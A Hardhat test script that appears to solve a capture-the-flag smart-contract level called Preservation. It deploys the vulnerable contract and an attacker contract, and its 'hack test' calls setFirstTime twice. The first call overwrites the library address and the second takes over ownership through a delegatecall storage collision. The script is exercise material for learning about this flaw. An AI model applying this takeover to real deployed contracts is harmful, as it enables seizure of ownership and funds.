const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("test", function () {
    var Preservation;
    var AttackPreservation;
    var Library1;
    var Library2;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const Library1Instance = await ethers.getContractFactory("LibraryContract");
        Library1 = await Library1Instance.deploy();
        const Library2Instance = await ethers.getContractFactory("LibraryContract");
        Library2 = await Library2Instance.deploy();
        const PreservationInstance = await ethers.getContractFactory("Preservation");
        Preservation = await PreservationInstance.deploy(Library1.address, Library2.address);
        const AttackPreservationInstance = await ethers.getContractFactory("AttackPreservation");
        AttackPreservation = await AttackPreservationInstance.deploy();
    });
    it("hack test", async function () {
        expect(await Preservation.timeZone1Library()).to.equal(Library1.address);

        expect(await Preservation.timeZone2Library()).to.equal(Library2.address);

        expect(await Preservation.owner()).to.equal(deployer.address);

        await Preservation.connect(users[0]).setFirstTime(AttackPreservation.address);

        expect(await Preservation.timeZone1Library()).to.equal(AttackPreservation.address);

        await Preservation.connect(users[0]).setFirstTime(users[0].address);

        expect(await Preservation.owner()).to.equal(users[0].address);
    });
});
